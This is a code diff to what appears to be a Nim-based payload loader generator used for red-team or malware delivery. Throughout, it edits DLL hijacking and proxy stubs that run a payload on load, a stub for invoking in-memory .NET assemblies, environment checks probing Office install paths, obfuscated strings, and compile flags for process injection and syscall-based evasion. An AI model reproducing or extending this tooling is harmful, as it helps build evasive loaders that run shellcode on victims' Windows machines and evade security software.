@@ -1707,7 +1707,7 @@ let LoadAssemblyStubNoArgs = """
     discard calcHard()
     var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
     discard calcHard()
-    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    discard assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 
 when not defined(proxy):
     when not defined(service):
@@ -2686,8 +2686,8 @@ proc officeFileCheck(): void =
     var fileCount: int = 0
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
-    let wideAppXManifest = newWideCString(AppXManifest)
-    dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideAppXManifest))
+    var wideAppXManifest: WideCString = newWideCString(AppXManifest)
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideAppXManifest))
     if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
@@ -2698,8 +2698,8 @@ proc officeFileCheck(): void =
     else:
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
-        let wideRappelZapp = newWideCString(RappelZapp)
-        dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideRappelZapp))
+        var wideRappelZapp: WideCString = newWideCString(RappelZapp)
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideRappelZapp))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2711,9 +2711,9 @@ proc officeFileCheck(): void =
     # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
     var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
     var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
-    let wideWindowsApps = newWideCString(WindowsApps)
-    let wideWindowsApps2 = newWideCString(WindowsApps2)
-    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps2))):
+    var wideWindowsApps: WideCString = newWideCString(WindowsApps)
+    var wideWindowsApps2: WideCString = newWideCString(WindowsApps2)
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps2))):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
@@ -2972,18 +2972,19 @@ let DllStub = """
 import dynlib
 proc NimMain() {.cdecl, importc.}
 
-when defined(notcloned) :
-    proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+when not defined(dllexportfuncs):
+    when defined(notcloned) :
+        proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 
-    proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+        proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 
-    proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        return true
+        proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+            NimMain()
+            return true
 """
 
 let PerfectDLLHijackStub = """
@@ -3010,19 +3011,20 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  when not defined(payloadFunc):
-    NimMain()
+  when not defined(dllexportfuncs):
+    when not defined(payloadFunc):
+      NimMain()
   
-  if fdwReason == DLL_PROCESS_ATTACH:
-    NimMain()
-    when defined(cloned):
-        when not defined(payloadFunc):
-            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-            CloseHandle(threadHandle)
-  if fdwReason == DLL_THREAD_ATTACH:
-    NimMain()
-  #if fdwReason == DLL_PROCESS_ATTACH:
-  #  NimMain()
+    if fdwReason == DLL_PROCESS_ATTACH:
+        NimMain()
+        when defined(cloned):
+            when not defined(payloadFunc):
+                var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+                CloseHandle(threadHandle)
+    if fdwReason == DLL_THREAD_ATTACH:
+        NimMain()
+    #if fdwReason == DLL_PROCESS_ATTACH:
+    #  NimMain()
   return true
 
 """
@@ -4400,15 +4402,19 @@ elif system.hostOS == "windows":
     if (denim):
         basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
     else:
-        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader
 
 if((existingprocessInjection == false) and (remoteinject) and (not conhostinject)):
     basicCompileFlags.add("-d:spawninject ")
 
 if(conhostinject):
     basicCompileFlags.add("-d:conhostinject ")
+
+# if dllexportfunctions sequence is not empty, add -d:dllexportfuncs
+if args["--dllexportfunc"]:
+    basicCompileFlags.add("-d:dllexportfuncs ")
 
 if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
@@ -4505,7 +4511,7 @@ if (dllProxy):
 
 # if payloadFunction is not empty, add -d:payloadFunc
 if (payloadFunction != ""):
-    basicCompileFlags.add(fmt"-d:payloadFunc -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg ")
+    basicCompileFlags.add(fmt"-d:payloadFunc ")
 
 if(service):
     basicCompileFlags.add("-d:service ")
@@ -4652,6 +4658,9 @@ else:
         basicCompileFlags.add("--app=console ")
     if (reflective):
         basicCompileFlags.add("--passL:-Wl,--dynamicbase,--export-all-symbols ")
+
+# add --passc=-static 
+basicCompileFlags.add("--passc=-static --passl=-static ")
 
 if((syswhispers != true) and (hellsgate != true)):
     if system.hostOS == "windows":
